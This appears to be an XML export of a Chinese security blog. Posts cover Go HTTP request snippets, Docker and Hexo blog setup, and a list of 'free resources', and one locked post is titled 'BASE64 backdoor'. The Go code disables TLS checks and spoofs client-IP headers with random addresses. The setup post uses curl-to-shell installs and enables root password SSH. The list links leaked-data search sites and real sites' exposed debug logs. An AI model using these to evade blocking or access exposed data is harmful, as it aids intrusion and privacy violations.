    <content type="text"><![CDATA[golang发送常见请求案例 QQ群：397745473 使用golang 发送get post 使用代理的代码片段。 golang 发送GET请求案例 .参考：https://studygolang.com/pkgdoc 参考： https://www.liwenzhou.com/posts/Go/go_http/ GET请求（方法1）123456789101112131415161718192021222324252627package mainimport ( &quot;fmt&quot; &quot;io/ioutil&quot; &quot;net/http&quot;)const ( targetURL = &quot;http://www.baidu.com/index.php?page=100&amp;c=222&quot;)func main() &#123; // 发送GET请求 resp, err := http.Get(targetURL) if err != nil &#123; fmt.Printf(&quot;访问出错!%v\n&quot;, err) return &#125; defer resp.Body.Close() b, err := ioutil.ReadAll(resp.Body) if err != nil &#123; fmt.Printf(&quot;读取数据出错!%v\n&quot;, err) return &#125; fmt.Println(string(b))&#125; GET请求（方法2）1234567891011121314151617181920212223242526272829303132333435363738package mainimport ( &quot;fmt&quot; &quot;io/ioutil&quot; &quot;net/http&quot; &quot;net/url&quot;)const ( targetURL = &quot;https://ipinfo.io&quot;)func main() &#123; // 发送GET请求 data := url.Values&#123;&#125; urlObj, _ := url.Parse(targetURL) data.Set(&quot;page&quot;, &quot;100&quot;) data.Set(&quot;c&quot;, &quot;222&quot;) querStr := data.Encode() // url encode之后的内容 fmt.Println(querStr) urlObj.RawQuery = querStr req, err := http.NewRequest(&quot;GET&quot;, urlObj.String(), nil) resp, err := http.DefaultClient.Do(req) if err != nil &#123; fmt.Printf(&quot;获取数据失败: %v&quot;, err) return &#125; defer resp.Body.Close() b, err := ioutil.ReadAll(resp.Body) if err != nil &#123; fmt.Printf(&quot;读数数出错: %v&quot;, err) &#125; fmt.Println(string(b))&#125; GET请求加代理加代理做请求，并且自定义头部信息 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package mainimport ( &quot;compress/gzip&quot; &quot;crypto/tls&quot; &quot;fmt&quot; &quot;io/ioutil&quot; &quot;net/http&quot; &quot;net/url&quot; &quot;time&quot;)const ( targetURL = &quot;https://ipinfo.io&quot;)func main() &#123; // 发送GET请求 proxy := func(_ *http.Request) (*url.URL, error) &#123; return url.Parse(&quot;socks5://127.0.0.1:7890&quot;) &#125; httpTransport := &amp;http.Transport&#123; //解决x509: certificate signed by unknown authority TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: true&#125;, Proxy: proxy, &#125; httpClient := &amp;http.Client&#123; Transport: httpTransport, //解决x509: certificate signed by unknown authority Timeout: time.Second * 10, //超时时间 &#125; req, err := http.NewRequest(&quot;GET&quot;, targetURL, nil) if err != nil &#123; // handle error return &#125; req.Header.Set(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot;) req.Header.Set(&quot;Accept&quot;, &quot;application/json, text/javascript, */*; q=0.01&quot;) req.Header.Set(&quot;Accept-Language&quot;, &quot;en-US,en;q=0.5&quot;) req.Header.Set(&quot;Accept-Encoding&quot;, &quot;gzip, deflate&quot;) req.Header.Set(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;) req.Header.Set(&quot;X-Requested-With&quot;, &quot;XMLHttpRequest&quot;) req.Header.Set(&quot;Connection&quot;, &quot;keep-alive&quot;) resp, err := httpClient.Do(req) if err != nil || resp.StatusCode == 403 || resp.StatusCode == 404 || resp.StatusCode == 503 &#123; // handle error // 这两行打日志的生成时取消,不然会打很多日志 //logger.Println(err) //logger.Println(requestURL) return &#125; defer resp.Body.Close() body, err := gzip.NewReader(resp.Body) // 解压 result, _ := ioutil.ReadAll(body) //result, err := ioutil.ReadAll(resp.Body) // 如果服务器开启了gzip,就需要先解压再读取 if err != nil &#123; // handle error //logger.Println(err) return &#125; fmt.Println(string(result))&#125; POST请求12345678910111213141516171819202122232425262728293031package mainimport ( &quot;fmt&quot; &quot;io/ioutil&quot; &quot;net/http&quot; &quot;strings&quot;)const ( targetURL = &quot;https://ipinfo.io&quot;)func main() &#123; // 发送POST请求 contentType := &quot;application/json&quot; data := `&#123;&quot;name&quot;:&quot;小王子&quot;,&quot;age&quot;:18&#125;` resp, err := http.Post(targetURL, contentType, strings.NewReader(data)) if err != nil &#123; fmt.Printf(&quot;post failed, err:%v\n&quot;, err) return &#125; defer resp.Body.Close() b, err := ioutil.ReadAll(resp.Body) if err != nil &#123; fmt.Printf(&quot;get resp failed, err:%v\n&quot;, err) return &#125; fmt.Println(string(b))&#125; 简单自定义POST请求123456789101112131415161718192021222324252627package mainimport ( &quot;fmt&quot; &quot;io/ioutil&quot; &quot;net/http&quot; &quot;strings&quot;)const ( targetURL = &quot;https://ipinfo.io&quot;)func main() &#123; // 发送POST请求 req, _ := http.NewRequest(&quot;POST&quot;, targetURL, strings.NewReader(&quot;formhash=测试1&amp;signsubmit=测试2&quot;)) req.Header.Set(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0&quot;) req.Header.Set(&quot;Accept&quot;, &quot;application/json, text/javascript, */*; q=0.01&quot;) // req.Header.Set(&quot;Accept-Encoding&quot;, &quot;gzip, deflate&quot;) // 本行导致将 response 结果从 byte转 string 错误，故注释本行，在发包时取消发送 Accept-Encoding 这个http头 client := &amp;http.Client&#123;&#125; resp, _ := client.Do(req) defer resp.Body.Close() readbody, _ := ioutil.ReadAll(resp.Body) fmt.Println(string(readbody))&#125; 完整的自定义POST方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081// 随机生成IP地址方法func genIpaddr() string &#123; rand.Seed(time.Now().Unix()) ip := fmt.Sprintf(&quot;%d.%d.%d.%d&quot;, rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)) return ip&#125;func postUrlResponse(Referer, requestURL, userkey, session string, wg *sync.WaitGroup) (string, string) &#123; defer wg.Done() //logger.Println(&quot;[GET]=&gt;&quot; + requestURL) randIp := genIpaddr() proxy := func(_ *http.Request) (*url.URL, error) &#123; return url.Parse(PROXY_ADDR) &#125; httpTransport := &amp;http.Transport&#123; //解决x509: certificate signed by unknown authority TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: true&#125;, Proxy: proxy, &#125; //req, err := http.NewRequest(&quot;POST&quot;, requestURL, nil) data := url.Values&#123;&#125; data.Set(&quot;data&quot;, datas) data.Set(&quot;__k&quot;, userkey) u, _ := url.ParseRequestURI(requestURL) u.RawQuery = data.Encode() urlStr := fmt.Sprintf(&quot;%v&quot;, u) // &quot;https://api.com/user/?name=foo&amp;surname=bar&quot; httpClient := &amp;http.Client&#123; Transport: httpTransport, //解决x509: certificate signed by unknown authority Timeout: time.Second * 10, //超时时间 &#125; //req, err := http.NewRequest(&quot;POST&quot;, urlStr, nil) req, err := http.NewRequest(http.MethodPost, urlStr, strings.NewReader(data.Encode())) // URL-encoded payload //req, err := http.NewRequest(&quot;POST&quot;, requestURL, bytes.NewBuffer(requestBody)) if err != nil &#123; // handle error return &quot;error&quot;, &quot;error&quot; &#125; req.Header.Set(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot;) req.Header.Set(&quot;Accept&quot;, &quot;application/json, text/javascript&quot;) req.Header.Set(&quot;Accept-Language&quot;, &quot;en-US,en;q=0.5&quot;) // req.Header.Set(&quot;Accept-Encoding&quot;, &quot;gzip, deflate&quot;) req.Header.Set(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;) req.Header.Set(&quot;X-Requested-With&quot;, &quot;XMLHttpRequest&quot;) req.Header.Set(&quot;Connection&quot;, &quot;keep-alive&quot;) req.Header.Set(&quot;Cookie&quot;, &quot;session=&quot;+session) req.Header.Set(&quot;Referer&quot;, Referer) req.Header.Set(&quot;Pragma&quot;, &quot;no-cache&quot;) req.Header.Set(&quot;Cache-Control&quot;, &quot;no-cache&quot;) req.Header.Set(&quot;X-Forward-For&quot;, randIp) req.Header.Set(&quot;HTTP_X_FORWARD_FOR&quot;, randIp) req.Header.Set(&quot;HTTP_CLIENT_IP&quot;, randIp) req.Header.Set(&quot;X-Real-IP&quot;, randIp) req.Header.Set(&quot;REMOTE_ADDR&quot;, randIp) resp, err := httpClient.Do(req) if err != nil || resp.StatusCode == 403 || resp.StatusCode == 404 || resp.StatusCode == 503 &#123; // handle error // 这两行打日志的生成时取消,不然会打很多日志 //logger.Println(err) //logger.Println(requestURL) return &quot;error&quot;, &quot;error&quot; &#125; defer resp.Body.Close() //body, err := gzip.NewReader(resp.Body) //result, _ := ioutil.ReadAll(body) result, err := ioutil.ReadAll(resp.Body) if err != nil &#123; // handle error //logger.Println(err) return &quot;error&quot;, &quot;error&quot; &#125; return string(result), datas&#125; QQ群：397745473]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GITHUB建立BLOG完整记录]]></title>
    <url>%2F2020%2F11%2F16%2F133_GITHUB%E5%BB%BA%E7%AB%8BBLOG%E5%AE%8C%E6%95%B4%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[GITHUB建立BLOG完整记录 QQ群：397745473 建立BLOG专属容器建立多个Blog 可以使用docker单独管理.十分方便. 命令如下: 1234567891011121314151617181920212223242526272829303132curl -sSL https://get.daocloud.io/docker | shservice docker startdocker pull ubuntudocker run -p 8081:80 -p 8022:22 -itd --name vsyourBlog ubuntu /bin/bash#进入容器 patchdocker exec -it vsyourBlog /bin/bashapt-get -y update &amp;&amp; apt-get -y upgradeapt-get -y install git net-tools openssh-server vimapt-get install language-pack-zh-hans提示: 1. Africa 2. America 3. Antarctica 4. Australia 5. Arctic 6. Asia 7. Atlantic 8. Europe 9. Indian 10. Pacific 11. SystemV 12. US 13. Etc选择: 6Please select the city or region corresponding to your time zone.再选: 70 shanghi更改/etc/ssh/sshd_config 配置vim /etc/ssh/sshd_config ::去掉以下两项的注释PermitRootLogin yes PasswordAuthentication yes # 重启服务/etc/init.d/ssh restartupdate-rc.d ssh defaultspasswd root现在可以直接使用 Bitvise SSH Client 连接这个docker了 开机自启docker后 开启或关闭自启容器12345678910开机自启docker后 开启或关闭自启容器docker run –restart=always当然如果你的容器已经启动,可以通过update命令进行修改.命令如下：docker update --restart=always &lt;CONTAINER ID&gt;docker update --restart=always 995f4f428c14如果你想取消掉 命令如下:ocker update --restart=no &lt;CONTAINER ID&gt; 建立Blog123456789101112131415161718192021222324建立参考: https://zhuanlan.zhihu.com/p/35668237https://godweiyang.com/2018/04/13/hexo-blog/apt install nodejsapt install npm npm i hexo-cli -gnpm i hexo-deployer-gitnpm install hexo-deployer-git --savemkdir /blog;cd /blog/输入hexo init初始化文件夹，接着输入npm install安装必备的组件。git config --global user.name &quot;vsyour&quot;git config --global user.email &quot;vsyour@qq.com&quot;git remote set-url blog github.com/vsyour/vsyour.com.gitssh-keygen -t rsa -C &quot;vsyour@qq.com&quot;cat ~/.ssh/id_rsa.pubcd /blog &amp;&amp; hexo clean &amp;&amp; hexo generate &amp;&amp; hexo deploy 加ssl证书域名A记录解析到: 1234185.199.108.153185.199.109.153185.199.110.153185.199.111.153 ubuntu中文支持,及中文乱码问题首先，安装中文支持包language-pack-zh-hans： 1apt-get install language-pack-zh-hans 然后，修改/etc/environment（在文件的末尾追加）： 12LANG=&quot;zh_CN.UTF-8&quot;LANGUAGE=&quot;zh_CN:zh:en_US:en&quot; 再修改/var/lib/locales/supported.d/local(没有这个文件就新建，同样在末尾追加)： 1234en_US.UTF-8 UTF-8zh_CN.UTF-8 UTF-8zh_CN.GBK GBKzh_CN GB2312 最后，执行命令： 1sudo locale-gen 对于中文乱码是空格的情况，安装中文字体解决。 1apt-get install fonts-droid-fallback ttf-wqy-zenhei ttf-wqy-microhei fonts-arphic-ukai fonts-arphic-uming 免密部署1234567加密钥后使用: ssh -T git@github.com 命令测试.看到提示: Hi vsyour/vsyour.com! You&apos;ve successfully authenticated, but GitHub does not provide shell access.成功后修改 _config.yml repo: git@github.com:vsyour/vsyour.com.git这个地址可以到github页面中查到. (平常git clone 的位置)code --&gt; clone --&gt; SSH --&gt;直接复制就可以了. QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何在Google Colab中运行Golang]]></title>
    <url>%2F2020%2F11%2F04%2F132_%E5%A6%82%E4%BD%95%E5%9C%A8Google%20Colab%E4%B8%AD%E8%BF%90%E8%A1%8CGolang%2F</url>
    <content type="text"><![CDATA[如何在Google Colab中运行Golang. 使用python运行时运行第一个代码单元。 刷新页面以使用Go内核（gonotenotes）。 通过运行下面的Golang单元，测试一切是否正常。 QQ群：397745473 打开Golang Notebook.ipynb1234561. 打开:https://colab.research.google.com/drive/1aoHKfyD2WT03Sjm0hHIdTPxa8z_ZiXly?usp=sharing2. 使用python运行时运行第一个代码单元3. 刷新页面以使用Go内核（gonotenotes）4. 开始使用 参考: https://www.ptrace-security.com/blog/how-to-run-golang-in-google-colab/ QQ群：397745473]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>goang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[免费资源整理]]></title>
    <url>%2F2020%2F11%2F03%2F130_%E5%85%8D%E8%B4%B9%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[免费资源整理 QQ群：397745473 免费VPS1234https://www.hkisl.net/https://ide.goorm.io/https://signup.heroku.com/https://cycle.io/pricing/ ssh.cloud.google.com使用技巧12345ssh.cloud.google.com 可以用来免费练练linux啥的. 经测试,如果开外网直接穿透使用 bitvise 连接时,会出现断开重置的现象.https://colab.research.google.com/drive/命令行获取公网IP: curl ifconfig.me 免费邮箱1临时邮箱: https://mail.tm/en (可以获取密码下次再登陆使用,比较方便) cs50免费VPS123FREE VPS LINK: https://cs50.ioSIGNUP LINK: https://www.edx.org/course网上介召大多是注册这个网络大学然后再去注册cs50,实践操作发现直接用临时邮箱注册一个gitHub登上cs50也是可以的. 免费域名12https://www.freenom.com/http://www.dot.tk/ 免费网盘1234Google Drive / OneDrive / Dropboxhttps://onedrive.live.com/ (5G)https://mega.nz (50G)https://drive.google.com/drive/ 免费网盘小技巧1使用rclone挂载Google Drive / OneDrive / Dropbox等网盘 免费在线解密123456解密： https://www.base64decode.org/https://www.unphp.net/recent/https://malwaredecoder.com/http://ddecode.com/phpdecoder/?history 代码存储1https://pastebin.com/ 免费小工具集1https://tools.miku.ac/ (翻墙才能打开) DeepFake项目1234567如何用DeepFake制作一个视频: GitHub上下载 Deepfacelab 或 Faceswap软件软件： https://arxiv.org/abs/2005.05535软件： https://github.com/iperov/DeepFaceLab软件： https://faceswap.dev/在线版： https://myvoiceyourface.com/参考： https://www.zhihu.com/question/382367348/answer/1140725612 免费黄页1https://curlie.org/ 免费可商用自适应静态页面模板12https://html5up.net/超过80个免费可商用自适应静态页面模板，做产品展示最适合啦 一个免费下载字体的软件1https://www.hellofont.cn/download 小软件库1https://louyue.com/ 免费图床123https://imgur.com/https://imgbb.com/https://gyazo.com (在线截图) 免费大数据1234567https://opendata.rapid7.com/网友评价:zoomeye 太贵了fofa 数据比较旧shodan 是屎censys 不错 免费内网穿透1https://dashboard.ngrok.com/ 免费漏洞公布12345678910111213141516171819202122232425https://cxsecurity.com/https://reportcybercrime.com/https://exploitbox.io/index.htmlhttps://www.exploit-db.com/https://packetstormsecurity.com/files/tags/exploit/https://www.exploitalert.com/https://sploitus.com/https://3wapp.github.io/ (收集了挺多信息的)https://www.hackercoolmagazine.com/blog/ (文章写得很细心)https://blog.ripstech.com/filter/vulnerabilities/cms/https://www.zhihuifly.com/c/7-category/7/l/tophttps://exploit.kitploit.com/http://www.expku.com/https://community.disclose.io/latesthttp://0day.todayhttp://mvfjfugdwgc5uwho.onion (Tor)http://ajanlar.org/index.phphttp://ajanlar.org/konu-Joomla-Component-GMapFP-3-30-Dosya-Y%C3%BCkleme-A%C3%A7%C4%B1%C4%9F%C4%B1.zz?pid=260636https://www.bugbountyhunter.com/disclosed/ (最新公开漏洞排序)https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/https://forum.surabayahackerlink.org/https://legalhackers.com/ 公共蜜罐1234http://www.nukuijidosya.co.jp/access_log.lasthttp://flixonase.agenda-sh.com/debug/default/index?page=1&amp;per-page=50&amp;sort=sqlCounthttp://flixonase.agenda-sh.com/debug/default/viewhttp://www.shopolis.gr/debug/default/index?sort=ip&amp;page=2&amp;per-page=50 免费社工库12http://scylla.shhttp://xjypo5vzgmo7jca6b322dnqbsdnp3amd24ybx26x5nxbusccjkm4pwid.onion/archive CMS地址收集12https://rescan.io/https://publicwww.com/ 查同站服务器1https://hackertarget.com/reverse-ip-lookup/ 查网站alexa,DA12http://www.visiospark.com/alexa-ranking-checker/http://link114.cn 录屏软件1录屏软件camtasia studio AI自动抠图1https://www.remove.bg/ 免费cdn1234https://www.cloudflare.com/intext:&quot;CNAME/IP/NS Setup&quot; 使用这个关键词搜出很多免费接入的CDN.可以直接用这个方法注册cloudflare账号,再用临时邮箱验证后使用cloudflare的works资源 开源扫描器12w12scanxray 渗透测试经典BLOG12345https://www.xljtj.com/ (心灵鸡汤君)http://k8gege.org/ (K8工具合集)https://saucer-man.com/ (SAUCERMAN)https://www.leavesongs.com/ (离别歌)https://github.com/dreddsa5dies/goHackTools go文件管理器123https://github.com/filebrowser/filebrowsercurl -fsSL https://filebrowser.org/get.sh | bash./filebrowser -a 0.0.0.0 -r . go常用测试代码1https://golang.hotexamples.com/ 在线代码测试1234567https://www.dooccn.com/支持在线执行以下代码：php5.3 php5.4 php5.5 php5.6 php7 php7.4 python2.7 python3 C# F# java1.7 java1.8 shell c语言 c++ nasm(汇编) go lua perl ruby nodejs Objective-C swift erlang rust R语言 scala haskell D语言 clojure groovy lisp ocaml CoffeeScript racket nim python教程 request教程 php教程各种在线工具： https://tool.lu/ 查子域名工具1https://github.com/shmilylty/OneForAll 扫描工具1https://github.com/chaitin 本地文件搜索工具12http://docfetcher.sourceforge.net/en/download.html （查文件内容很方便）Everything： https://www.voidtools.com/zh-cn/ (查文件名很快) QQ群：397745473]]></content>
      <categories>
        <category>免费资源</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>免费资源整理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BASE64方式调用后门]]></title>
    <url>%2F2020%2F11%2F03%2F131_BASE64%E6%96%B9%E5%BC%8F%E8%B0%83%E7%94%A8%E5%90%8E%E9%97%A8%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[快速搭建PCIDSS渗透测试所需VPN]]></title>
    <url>%2F2020%2F09%2F03%2F129_%E6%90%AD%E5%BB%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%89%80%E9%9C%80VPN%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! 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